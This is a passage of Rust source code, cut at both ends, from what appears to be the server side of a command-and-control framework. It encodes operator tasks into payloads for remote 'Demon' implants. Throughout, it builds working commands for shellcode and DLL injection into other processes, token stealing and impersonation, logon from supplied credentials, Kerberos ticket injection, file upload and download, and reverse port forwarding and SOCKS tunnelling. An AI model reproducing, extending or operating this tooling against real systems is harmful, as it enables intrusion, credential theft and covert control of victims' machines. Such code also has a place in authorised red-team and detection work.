                plugins.invoke_registered_command(&command, actor, agent_id, args).await?
            } else {
                false
            }
        } else {
            false
        };

        if handled_by_plugin {
            0
        } else {
            let jobs = build_jobs(&message.info, actor)?;
            let queued_jobs = jobs.len();
            for job in jobs {
                registry.enqueue_job(agent_id, job).await?;
            }
            queued_jobs
        }
    };

    events.broadcast(OperatorMessage::AgentTask(message));
    Ok(queued_jobs)
}

async fn handle_agent_remove(
    registry: &AgentRegistry,
    sockets: &SocketRelayManager,
    events: &EventBus,
    database: &Database,
    webhooks: &AuditWebhookNotifier,
    session: &crate::OperatorSession,
    message: Message<FlatInfo>,
) -> Result<(), AgentCommandError> {
    let Some(agent_id) = flat_info_string(&message.info, &["AgentID", "DemonID"]) else {
        return Err(AgentCommandError::InvalidRemovePayload);
    };
    let agent_id = parse_agent_id(&agent_id)?;
    match registry.remove(agent_id).await {
        Ok(_) => {
            log_operator_action(
                database,
                webhooks,
                &session.username,
                "agent.delete",
                "agent",
                Some(format!("{agent_id:08X}")),
                audit_details(
                    AuditResultStatus::Success,
                    Some(agent_id),
                    Some("delete"),
                    Some(parameter_object([(
                        "agent_id",
                        Value::String(format!("{agent_id:08X}")),
                    )])),
                ),
            )
            .await;
            let _ = sockets.remove_agent(agent_id).await;
            events.broadcast(OperatorMessage::AgentRemove(message));
        }
        Err(error) => {
            log_operator_action(
                database,
                webhooks,
                &session.username,
                "agent.delete",
                "agent",
                Some(format!("{agent_id:08X}")),
                audit_details(
                    AuditResultStatus::Failure,
                    Some(agent_id),
                    Some("delete"),
                    Some(parameter_object([
                        ("agent_id", Value::String(format!("{agent_id:08X}"))),
                        ("error", Value::String(error.to_string())),
                    ])),
                ),
            )
            .await;
            return Err(error.into());
        }
    }
    debug!(
        connection_id = %session.connection_id,
        username = %session.username,
        agent_id = format_args!("{agent_id:08X}"),
        "handled operator agent remove command"
    );
    Ok(())
}

fn sanitize_agent_task(
    session: &crate::OperatorSession,
    mut message: Message<red_cell_common::operator::AgentTaskInfo>,
) -> Message<red_cell_common::operator::AgentTaskInfo> {
    message.head.user = session.username.clone();
    message
}

fn sanitize_agent_remove(
    session: &crate::OperatorSession,
    mut message: Message<FlatInfo>,
) -> Message<FlatInfo> {
    message.head.user = session.username.clone();
    message
}

#[cfg(test)]
fn build_job(info: &red_cell_common::operator::AgentTaskInfo) -> Result<Job, AgentCommandError> {
    let mut jobs = build_jobs(info, "")?;
    jobs.pop().ok_or(AgentCommandError::MissingField { field: "CommandID" })
}

fn build_jobs(
    info: &red_cell_common::operator::AgentTaskInfo,
    operator: &str,
) -> Result<Vec<Job>, AgentCommandError> {
    let command_id = info.command_id.trim();
    let task_id_trimmed = info.task_id.trim();
    let request_id = u32::from_str_radix(task_id_trimmed, 16)
        .map_err(|_| AgentCommandError::InvalidTaskId { task_id: info.task_id.clone() })?;

    if is_teamserver_note_command(info) {
        return Err(AgentCommandError::MissingNote);
    }

    let command = if is_exit_command(info) {
        u32::from(DemonCommand::CommandExit)
    } else {
        command_id.parse::<u32>().map_err(|_| AgentCommandError::InvalidCommandId {
            command_id: command_id.to_owned(),
        })?
    };
    let created_at = OffsetDateTime::now_utc().unix_timestamp().to_string();

    if command == u32::from(DemonCommand::CommandFs)
        && matches!(filesystem_subcommand(info)?, DemonFilesystemCommand::Upload)
    {
        return build_upload_jobs(info, request_id, &created_at, operator);
    }

    let payload = task_payload(info, command)?;
    Ok(vec![Job {
        command,
        request_id,
        payload,
        command_line: info.command_line.clone(),
        task_id: info.task_id.clone(),
        created_at,
        operator: operator.to_owned(),
    }])
}

fn task_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
    command: u32,
) -> Result<Vec<u8>, AgentCommandError> {
    if is_exit_command(info) {
        return Ok(exit_method(info).to_be_bytes().to_vec());
    }

    if let Some(payload) = raw_task_payload(info)? {
        return Ok(payload);
    }

    if command == u32::from(DemonCommand::CommandProcList) {
        return Ok(encode_proc_list_payload(info));
    }

    if command == u32::from(DemonCommand::CommandFs) {
        return encode_fs_payload(info);
    }

    if command == u32::from(DemonCommand::CommandProc) {
        return encode_proc_command_payload(info);
    }

    if command == u32::from(DemonCommand::CommandInjectShellcode) {
        return encode_inject_shellcode_payload(info);
    }

    if command == u32::from(DemonCommand::CommandToken) {
        return encode_token_payload(info);
    }

    if command == u32::from(DemonCommand::CommandSocket) {
        return encode_socket_payload(info);
    }

    if command == u32::from(DemonCommand::CommandKerberos) {
        return encode_kerberos_payload(info);
    }

    if command == u32::from(DemonCommand::CommandInjectDll) {
        return encode_inject_dll_payload(info);
    }

    if command == u32::from(DemonCommand::CommandSpawnDll) {
        return encode_spawn_dll_payload(info);
    }

    Ok(Vec::new())
}

fn build_upload_jobs(
    info: &red_cell_common::operator::AgentTaskInfo,
    request_id: u32,
    created_at: &str,
    operator: &str,
) -> Result<Vec<Job>, AgentCommandError> {
    let remote_path = upload_remote_path(info)?;
    let content = upload_content(info)?;
    let memfile_id = random_u32();
    let mut jobs = Vec::new();

    for chunk in content.chunks(DEMON_MAX_RESPONSE_LENGTH) {
        let mut payload = Vec::new();
        write_u32(&mut payload, memfile_id);
        write_u64(&mut payload, u64::try_from(content.len()).unwrap_or_default());
        write_len_prefixed_bytes(&mut payload, chunk)?;
        jobs.push(Job {
            command: u32::from(DemonCommand::CommandMemFile),
            request_id: random_u32(),
            payload,
            command_line: info.command_line.clone(),
            task_id: info.task_id.clone(),
            created_at: created_at.to_owned(),
            operator: operator.to_owned(),
        });
    }

    let mut payload = Vec::new();
    write_u32(&mut payload, u32::from(DemonFilesystemCommand::Upload));
    write_len_prefixed_bytes(&mut payload, &encode_utf16(&remote_path))?;
    write_u32(&mut payload, memfile_id);
    jobs.push(Job {
        command: u32::from(DemonCommand::CommandFs),
        request_id,
        payload,
        command_line: info.command_line.clone(),
        task_id: info.task_id.clone(),
        created_at: created_at.to_owned(),
        operator: operator.to_owned(),
    });

    Ok(jobs)
}

fn note_from_task(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Option<String>, AgentCommandError> {
    if !is_teamserver_note_command(info) {
        return Ok(None);
    }

    let note = info
        .arguments
        .clone()
        .or_else(|| info.task_message.clone())
        .or_else(|| flat_info_string_from_extra(&info.extra, &["Note", "note"]))
        .map(|value| value.trim().to_owned())
        .filter(|value| !value.is_empty())
        .ok_or(AgentCommandError::MissingNote)?;

    Ok(Some(note))
}

fn is_teamserver_note_command(info: &red_cell_common::operator::AgentTaskInfo) -> bool {
    info.command_id.eq_ignore_ascii_case("Teamserver")
        && info.command.as_deref().is_some_and(|command| {
            command.eq_ignore_ascii_case("note") || command.eq_ignore_ascii_case("agent::note")
        })
}

fn is_exit_command(info: &red_cell_common::operator::AgentTaskInfo) -> bool {
    info.command_id.trim() == u32::from(DemonCommand::CommandExit).to_string()
        || info.command.as_deref().is_some_and(|command| {
            command.eq_ignore_ascii_case("kill") || command.eq_ignore_ascii_case("agent::kill")
        })
}

fn exit_method(info: &red_cell_common::operator::AgentTaskInfo) -> u32 {
    match info.arguments.as_deref() {
        Some(argument) if argument.eq_ignore_ascii_case("process") => 2,
        _ => 1,
    }
}

fn parse_agent_id(agent_id: &str) -> Result<u32, AgentCommandError> {
    let trimmed = agent_id.trim();
    if trimmed.is_empty() {
        return Err(AgentCommandError::MissingAgentId);
    }

    u32::from_str_radix(trimmed.trim_start_matches("0x").trim_start_matches("0X"), 16)
        .map_err(|_| AgentCommandError::InvalidAgentId { agent_id: trimmed.to_owned() })
}

fn flat_info_string(info: &FlatInfo, keys: &[&str]) -> Option<String> {
    flat_info_string_from_extra(&info.fields, keys)
}

fn flat_info_string_from_extra(extra: &BTreeMap<String, Value>, keys: &[&str]) -> Option<String> {
    keys.iter().find_map(|key| extra.get(*key)).and_then(Value::as_str).map(ToOwned::to_owned)
}

fn raw_task_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Option<Vec<u8>>, AgentCommandError> {
    if let Some(payload) = flat_info_string_from_extra(&info.extra, &["PayloadBase64"]) {
        let decoded = BASE64_STANDARD.decode(payload.trim()).map_err(|error| {
            AgentCommandError::InvalidBase64Field {
                field: "PayloadBase64".to_owned(),
                message: error.to_string(),
            }
        })?;
        return Ok(Some(decoded));
    }

    Ok(flat_info_string_from_extra(&info.extra, &["Payload"]).map(|payload| payload.into_bytes()))
}

fn encode_proc_list_payload(info: &red_cell_common::operator::AgentTaskInfo) -> Vec<u8> {
    let from_process_manager = extra_bool(info, &["FromProcessManager"]).unwrap_or(false);
    u32::from(from_process_manager).to_le_bytes().to_vec()
}

fn encode_fs_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = filesystem_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, u32::from(subcommand));

    match subcommand {
        DemonFilesystemCommand::Dir => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts = args.splitn(8, ';').collect::<Vec<_>>();
            if parts.len() != 8 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            write_u32(&mut payload, 0);
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[0]))?;
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[1]", parts[1])?));
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[2]", parts[2])?));
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[3]", parts[3])?));
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[4]", parts[4])?));
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[5]))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[6]))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[7]))?;
        }
        DemonFilesystemCommand::Download | DemonFilesystemCommand::Cat => {
            let path = decode_base64_required(info, &["Arguments"], "Arguments")?;
            let path = String::from_utf8_lossy(&path).into_owned();
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path))?;
        }
        DemonFilesystemCommand::Upload => {
            let remote_path = upload_remote_path(info)?;
            let memfile_id = required_u32(info, &["MemFileId"], "MemFileId")?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&remote_path))?;
            write_u32(&mut payload, memfile_id);
        }
        DemonFilesystemCommand::Cd
        | DemonFilesystemCommand::Remove
        | DemonFilesystemCommand::Mkdir => {
            let path = required_string(info, &["Arguments"], "Arguments")?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path))?;
        }
        DemonFilesystemCommand::Copy | DemonFilesystemCommand::Move => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts = args.splitn(2, ';').collect::<Vec<_>>();
            if parts.len() != 2 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            let from = String::from_utf8_lossy(&decode_base64_field("Arguments[0]", parts[0])?)
                .into_owned();
            let to = String::from_utf8_lossy(&decode_base64_field("Arguments[1]", parts[1])?)
                .into_owned();
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&from))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&to))?;
        }
        DemonFilesystemCommand::GetPwd => {}
    }

    Ok(payload)
}

fn encode_proc_command_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = proc_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, subcommand.into());

    match subcommand {
        DemonProcessCommand::Kill => {
            let pid = required_u32(info, &["Args", "Arguments"], "Args")?;
            write_u32(&mut payload, pid);
        }
        DemonProcessCommand::Create => {
            let arguments = required_string(info, &["Args", "Arguments"], "Args")?;
            let parts = arguments.splitn(5, ';').collect::<Vec<_>>();
            if parts.len() != 5 {
                return Err(AgentCommandError::InvalidProcessCreateArguments);
            }

            let state = parse_u32_field("Args[0]", parts[0])?;
            let verbose = parse_bool_field("Args[1]", parts[1])?;
            let piped = parse_bool_field("Args[2]", parts[2])?;
            let program = parts[3];
            let process_args = decode_base64_field("Args[4]", parts[4])?;
            let process_args = String::from_utf8_lossy(&process_args).into_owned();

            write_u32(&mut payload, state);
            write_len_prefixed_bytes(&mut payload, &encode_utf16(program))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&process_args))?;
            write_u32(&mut payload, u32::from(piped));
            write_u32(&mut payload, u32::from(verbose));
        }
        DemonProcessCommand::Modules => {
            let pid = required_u32(info, &["Args", "Arguments"], "Args")?;
            write_u32(&mut payload, pid);
        }
        DemonProcessCommand::Grep => {
            let pattern = required_string(info, &["Args", "Arguments"], "Args")?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&pattern))?;
        }
        DemonProcessCommand::Memory => {
            let arguments = required_string(info, &["Args", "Arguments"], "Args")?;
            let parts = arguments.split_whitespace().collect::<Vec<_>>();
            if parts.len() < 2 {
                return Err(AgentCommandError::MissingField { field: "Args" });
            }
            let pid = parse_u32_field("PID", parts[0])?;
            let protection = parse_memory_protection(parts[1])?;
            write_u32(&mut payload, pid);
            write_u32(&mut payload, protection);
        }
    }

    Ok(payload)
}

fn encode_inject_shellcode_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let way = required_string(info, &["Way"], "Way")?;
    let technique = required_string(info, &["Technique"], "Technique")?;
    let arch = required_string(info, &["Arch"], "Arch")?;
    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
    let arguments = optional_base64(info, &["Argument", "Arguments"])?.unwrap_or_default();

    let mut payload = Vec::new();
    match parse_injection_way(&way)? {
        DemonInjectWay::Inject => {
            write_u32(&mut payload, u32::from(DemonInjectWay::Inject));
            write_u32(&mut payload, parse_injection_technique(&technique)?);
            write_u32(&mut payload, arch_to_flag(&arch)?);
            write_len_prefixed_bytes(&mut payload, &binary)?;
            write_len_prefixed_bytes(&mut payload, &arguments)?;
            let pid = required_u32(info, &["PID"], "PID")?;
            write_u32(&mut payload, pid);
        }
        DemonInjectWay::Spawn => {
            write_u32(&mut payload, u32::from(DemonInjectWay::Spawn));
            write_u32(&mut payload, parse_injection_technique(&technique)?);
            write_u32(&mut payload, arch_to_flag(&arch)?);
            write_len_prefixed_bytes(&mut payload, &binary)?;
            write_len_prefixed_bytes(&mut payload, &arguments)?;
        }
        other => {
            return Err(AgentCommandError::UnsupportedInjectionWay {
                way: u32::from(other).to_string(),
            });
        }
    }

    Ok(payload)
}

fn encode_token_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = token_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, subcommand.into());

    match subcommand {
        DemonTokenCommand::Impersonate => {
            let token_id = required_u32(info, &["Arguments"], "Arguments")?;
            write_u32(&mut payload, token_id);
        }
        DemonTokenCommand::Steal => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts: Vec<&str> = args.split(';').collect();
            if parts.len() < 2 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            let pid = parse_u32_field("PID", parts[0])?;
            let handle = parse_hex_u32(parts[1])?;
            write_u32(&mut payload, pid);
            write_u32(&mut payload, handle);
        }
        DemonTokenCommand::List
        | DemonTokenCommand::GetUid
        | DemonTokenCommand::Revert
        | DemonTokenCommand::Clear
        | DemonTokenCommand::FindTokens => {}
        DemonTokenCommand::PrivsGetOrList => {
            let sub_from_extra = flat_info_string_from_extra(&info.extra, &["SubCommand"]);
            let sub = info.sub_command.as_deref().or(sub_from_extra.as_deref()).unwrap_or("");
            if sub.eq_ignore_ascii_case("privs-list") || sub == "4" {
                write_u32(&mut payload, 1);
            } else {
                write_u32(&mut payload, 0);
                let priv_name = required_string(info, &["Arguments"], "Arguments")?;
                write_len_prefixed_bytes(&mut payload, priv_name.as_bytes())?;
            }
        }
        DemonTokenCommand::Make => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts: Vec<&str> = args.split(';').collect();
            if parts.len() < 4 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            let domain = decode_base64_field("Domain", parts[0])?;
            let user = decode_base64_field("User", parts[1])?;
            let password = decode_base64_field("Password", parts[2])?;
            let logon_type = parse_u32_field("LogonType", parts[3])?;
            write_len_prefixed_bytes(
                &mut payload,
                &encode_utf16(&String::from_utf8_lossy(&domain)),
            )?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&String::from_utf8_lossy(&user)))?;
            write_len_prefixed_bytes(
                &mut payload,
                &encode_utf16(&String::from_utf8_lossy(&password)),
            )?;
            write_u32(&mut payload, logon_type);
        }
        DemonTokenCommand::Remove => {
            let token_id = required_u32(info, &["Arguments"], "Arguments")?;
            write_u32(&mut payload, token_id);
        }
    }

    Ok(payload)
}

fn encode_socket_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let command = socket_command(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, command.0);

    match command.1.as_str() {
        "rportfwd add" => {
            let params = required_string(info, &["Params", "Arguments"], "Params")?;
            let parts = params.split(';').map(str::trim).collect::<Vec<_>>();
            if parts.len() != 4 {
                return Err(AgentCommandError::MissingField { field: "Params" });
            }
            write_u32(&mut payload, ipv4_to_u32(parts[0])?);
            write_u32(&mut payload, parse_u32_field("Params[1]", parts[1])?);
            write_u32(&mut payload, ipv4_to_u32(parts[2])?);
            write_u32(&mut payload, parse_u32_field("Params[3]", parts[3])?);
        }
        "rportfwd remove" => {
            let socket_id =
                parse_hex_u32(&required_string(info, &["Params", "Arguments"], "Params")?)?;
            write_u32(&mut payload, socket_id);
        }
        "rportfwd list" | "rportfwd clear" => {}
        _ => return Err(AgentCommandError::UnsupportedSocketSubcommand { subcommand: command.1 }),
    }

    Ok(payload)
}

fn encode_kerberos_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = kerberos_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, u32::from(subcommand));

    match subcommand {
        DemonKerberosCommand::Luid => {}
        DemonKerberosCommand::Klist => {
            let arg1 = required_string(info, &["Argument1", "Arguments"], "Argument1")?;
            if arg1.eq_ignore_ascii_case("/all") {
                write_u32(&mut payload, 0);
            } else if arg1.eq_ignore_ascii_case("/luid") {
                write_u32(&mut payload, 1);
                let luid = parse_hex_u32(&required_string(info, &["Argument2"], "Argument2")?)?;
                write_u32(&mut payload, luid);
            } else {
                return Err(AgentCommandError::UnsupportedKerberosSubcommand { subcommand: arg1 });
            }
        }
        DemonKerberosCommand::Purge => {
            let luid =
                parse_hex_u32(&required_string(info, &["Argument", "Arguments"], "Argument")?)?;
            write_u32(&mut payload, luid);
        }
        DemonKerberosCommand::Ptt => {
            let ticket = decode_base64_required(info, &["Ticket"], "Ticket")?;
            let luid = parse_hex_u32(&required_string(info, &["Luid"], "Luid")?)?;
            write_len_prefixed_bytes(&mut payload, &ticket)?;
            write_u32(&mut payload, luid);
        }
    }

    Ok(payload)
}

fn encode_inject_dll_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let technique = optional_u32(info, &["Technique"]).unwrap_or(0);
    let pid = required_u32(info, &["PID"], "PID")?;
    let loader = decode_base64_required(info, &["DllLoader", "Loader"], "DllLoader")?;
    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
    let arguments = optional_base64(info, &["Arguments", "Argument"])?.unwrap_or_default();

    let mut payload = Vec::new();
    write_u32(&mut payload, technique);
    write_u32(&mut payload, pid);
    write_len_prefixed_bytes(&mut payload, &loader)?;
    write_len_prefixed_bytes(&mut payload, &binary)?;
    write_len_prefixed_bytes(&mut payload, &arguments)?;
    Ok(payload)
}

fn encode_spawn_dll_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let loader = decode_base64_required(info, &["DllLoader", "Loader"], "DllLoader")?;
    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
    let arguments = optional_base64(info, &["Arguments", "Argument"])?.unwrap_or_default();

    let mut payload = Vec::new();
    write_len_prefixed_bytes(&mut payload, &loader)?;
    write_len_prefixed_bytes(&mut payload, &binary)?;
    write_len_prefixed_bytes(&mut payload, &arguments)?;
    Ok(payload)
}

fn proc_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonProcessCommand, AgentCommandError> {
    let raw = flat_info_string_from_extra(&info.extra, &["ProcCommand"])
        .or_else(|| info.sub_command.clone())
        .ok_or(AgentCommandError::MissingField { field: "ProcCommand" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "2" | "modules" => Ok(DemonProcessCommand::Modules),
        "3" | "grep" => Ok(DemonProcessCommand::Grep),
        "4" | "create" => Ok(DemonProcessCommand::Create),
        "6" | "memory" => Ok(DemonProcessCommand::Memory),
        "7" | "kill" => Ok(DemonProcessCommand::Kill),
        _ => Err(AgentCommandError::UnsupportedProcessSubcommand { subcommand: raw }),
    }
}

fn filesystem_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonFilesystemCommand, AgentCommandError> {
    let raw = info
        .sub_command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["SubCommand"]))
        .ok_or(AgentCommandError::MissingField { field: "SubCommand" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "1" | "dir" | "ls" => Ok(DemonFilesystemCommand::Dir),
        "2" | "download" => Ok(DemonFilesystemCommand::Download),
        "3" | "upload" => Ok(DemonFilesystemCommand::Upload),
        "4" | "cd" => Ok(DemonFilesystemCommand::Cd),
        "5" | "remove" | "rm" | "del" => Ok(DemonFilesystemCommand::Remove),
        "6" | "mkdir" => Ok(DemonFilesystemCommand::Mkdir),
        "7" | "cp" | "copy" => Ok(DemonFilesystemCommand::Copy),
        "8" | "mv" | "move" => Ok(DemonFilesystemCommand::Move),
        "9" | "pwd" => Ok(DemonFilesystemCommand::GetPwd),
        "10" | "cat" | "type" => Ok(DemonFilesystemCommand::Cat),
        _ => Err(AgentCommandError::UnsupportedFilesystemSubcommand { subcommand: raw }),
    }
}

fn token_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonTokenCommand, AgentCommandError> {
    let raw = info
        .sub_command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["SubCommand"]))
        .ok_or(AgentCommandError::MissingField { field: "SubCommand" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "1" | "impersonate" => Ok(DemonTokenCommand::Impersonate),
        "2" | "steal" => Ok(DemonTokenCommand::Steal),
        "3" | "list" => Ok(DemonTokenCommand::List),
        "4" | "privs-list" | "privs-get" | "privs" => Ok(DemonTokenCommand::PrivsGetOrList),
        "5" | "make" => Ok(DemonTokenCommand::Make),
        "6" | "getuid" => Ok(DemonTokenCommand::GetUid),
        "7" | "revert" => Ok(DemonTokenCommand::Revert),
        "8" | "remove" => Ok(DemonTokenCommand::Remove),
        "9" | "clear" => Ok(DemonTokenCommand::Clear),
        "10" | "find" => Ok(DemonTokenCommand::FindTokens),
        _ => Err(AgentCommandError::UnsupportedTokenSubcommand { subcommand: raw }),
    }
}

fn socket_command(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<(u32, String), AgentCommandError> {
    let raw = info
        .command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["Command"]))
        .ok_or(AgentCommandError::MissingField { field: "Command" })?;
    let normalized = raw.trim().to_ascii_lowercase();
    let command = match normalized.as_str() {
        "rportfwd add" => u32::from(DemonSocketCommand::ReversePortForwardAdd),
        "rportfwd list" => u32::from(DemonSocketCommand::ReversePortForwardList),
        "rportfwd remove" => u32::from(DemonSocketCommand::ReversePortForwardRemove),
        "rportfwd clear" => u32::from(DemonSocketCommand::ReversePortForwardClear),
        "socks add" | "socks list" | "socks kill" | "socks clear" => {
            u32::from(DemonSocketCommand::SocksProxyAdd)
        }
        _ => {
            return Err(AgentCommandError::UnsupportedSocketSubcommand { subcommand: raw });
        }
    };
    Ok((command, normalized))
}

fn kerberos_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonKerberosCommand, AgentCommandError> {
    let raw = info
        .command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["Command"]))
        .ok_or(AgentCommandError::MissingField { field: "Command" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "luid" => Ok(DemonKerberosCommand::Luid),
        "klist" => Ok(DemonKerberosCommand::Klist),
        "purge" => Ok(DemonKerberosCommand::Purge),
        "ptt" => Ok(DemonKerberosCommand::Ptt),
        _ => Err(AgentCommandError::UnsupportedKerberosSubcommand { subcommand: raw }),
    }
}

async fn handle_teamserver_socket_task(
    sockets: &SocketRelayManager,
    agent_id: u32,
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Option<String>, AgentCommandError> {
    if info.command_id.trim() != u32::from(DemonCommand::CommandSocket).to_string() {
        return Ok(None);
    }

    let (_, command) = socket_command(info)?;
    let result = match command.as_str() {
        "socks add" => Some(
            sockets
                .add_socks_server(
                    agent_id,
                    &required_string(info, &["Params", "Arguments"], "Params")?,
                )
                .await?,
        ),
        "socks list" => Some(sockets.list_socks_servers(agent_id).await),
        "socks kill" => Some(
            sockets
                .remove_socks_server(
                    agent_id,
                    &required_string(info, &["Params", "Arguments"], "Params")?,
                )
                .await?,
        ),
        "socks clear" => Some(sockets.clear_socks_servers(agent_id).await?),
        _ => None,
    };

    Ok(result)
}

fn parse_injection_way(value: &str) -> Result<DemonInjectWay, AgentCommandError> {
    match value.trim().to_ascii_lowercase().as_str() {
        "inject" => Ok(DemonInjectWay::Inject),
        "spawn" => Ok(DemonInjectWay::Spawn),
        _ => Err(AgentCommandError::UnsupportedInjectionWay { way: value.to_owned() }),
    }
}

fn parse_memory_protection(value: &str) -> Result<u32, AgentCommandError> {
    match value.to_ascii_uppercase().as_str() {
        "PAGE_NOACCESS" => Ok(0x01),
        "PAGE_READONLY" => Ok(0x02),
        "PAGE_READWRITE" => Ok(0x04),
        "PAGE_WRITECOPY" => Ok(0x08),
        "PAGE_EXECUTE" => Ok(0x10),
        "PAGE_EXECUTE_READ" => Ok(0x20),
        "PAGE_EXECUTE_READWRITE" => Ok(0x40),
        "PAGE_EXECUTE_WRITECOPY" => Ok(0x80),
        "PAGE_GUARD" => Ok(0x100),
        _ => Err(AgentCommandError::InvalidNumericField {
            field: "MemoryProtection".to_owned(),
            value: value.to_owned(),
        }),
    }
}

fn parse_injection_technique(value: &str) -> Result<u32, AgentCommandError> {
    match value.trim().to_ascii_lowercase().as_str() {
        "default" => Ok(0),
        "createremotethread" => Ok(1),
        "ntcreatethreadex" => Ok(2),
        "ntqueueapcthread" => Ok(3),
        _ => Err(AgentCommandError::UnsupportedInjectionTechnique { technique: value.to_owned() }),
    }
}

fn arch_to_flag(value: &str) -> Result<u32, AgentCommandError> {
    match value.trim().to_ascii_lowercase().as_str() {
        "x86" => Ok(0),
        "x64" => Ok(1),
        _ => Err(AgentCommandError::UnsupportedArchitecture { arch: value.to_owned() }),
    }
}

fn required_string(
    info: &red_cell_common::operator::AgentTaskInfo,
    keys: &[&str],
    field: &'static str,
) -> Result<String, AgentCommandError> {
    string_field(info, keys).ok_or(AgentCommandError::MissingField { field })
}

fn required_u32(
    info: &red_cell_common::operator::AgentTaskInfo,
    keys: &[&str],
    field: &'static str,
) -> Result<u32, AgentCommandError> {
    let value = required_string(info, keys, field)?;
    parse_u32_field(field, &value)
}

fn optional_u32(info: &red_cell_common::operator::AgentTaskInfo, keys: &[&str]) -> Option<u32> {
    string_field(info, keys).and_then(|value| value.trim().parse::<u32>().ok())
}

fn optional_base64(
    info: &red_cell_common::operator::AgentTaskInfo,
    keys: &[&str],
) -> Result<Option<Vec<u8>>, AgentCommandError> {
    string_field(info, keys).map(|value| decode_base64_field(keys[0], &value)).transpose()
}

fn decode_base64_required(
    info: &red_cell_common::operator::AgentTaskInfo,
    keys: &[&str],
    field: &'static str,
) -> Result<Vec<u8>, AgentCommandError> {
    let value = required_string(info, keys, field)?;
    decode_base64_field(field, &value)
}

fn decode_base64_field(field: &str, value: &str) -> Result<Vec<u8>, AgentCommandError> {
    BASE64_STANDARD.decode(value.trim()).map_err(|error| AgentCommandError::InvalidBase64Field {
        field: field.to_owned(),
        message: error.to_string(),
    })
}

fn string_field(info: &red_cell_common::operator::AgentTaskInfo, keys: &[&str]) -> Option<String> {
    for key in keys {
        match *key {
            "Arguments" => {
                if let Some(value) = info.arguments.clone() {
                    return Some(value);
                }
            }
            "SubCommand" => {
                if let Some(value) = info.sub_command.clone() {
                    return Some(value);
                }
            }
            _ => {}
        }

        if let Some(value) = info.extra.get(*key) {
            match value {
                Value::String(text) => return Some(text.clone()),
                Value::Bool(flag) => return Some(flag.to_string()),
                Value::Number(number) => return Some(number.to_string()),
                _ => {}
            }
        }
    }

    None
}

fn extra_bool(info: &red_cell_common::operator::AgentTaskInfo, keys: &[&str]) -> Option<bool> {
    for key in keys {
        let Some(value) = info.extra.get(*key) else {
            continue;
        };
        match value {
            Value::Bool(flag) => return Some(*flag),
            Value::String(text) => {
                if let Ok(flag) = parse_bool_field(key, text) {
                    return Some(flag);
                }
            }
            Value::Number(number) => return Some(number.as_u64().unwrap_or_default() != 0),
            _ => {}
        }
    }

    None
}

fn parse_bool_field(field: &str, value: &str) -> Result<bool, AgentCommandError> {
    match value.trim().to_ascii_lowercase().as_str() {
        "1" | "true" => Ok(true),
        "0" | "false" => Ok(false),
        _ => Err(AgentCommandError::InvalidBooleanField {
            field: field.to_owned(),
            value: value.to_owned(),
        }),
    }
}

fn parse_u32_field(field: &str, value: &str) -> Result<u32, AgentCommandError> {
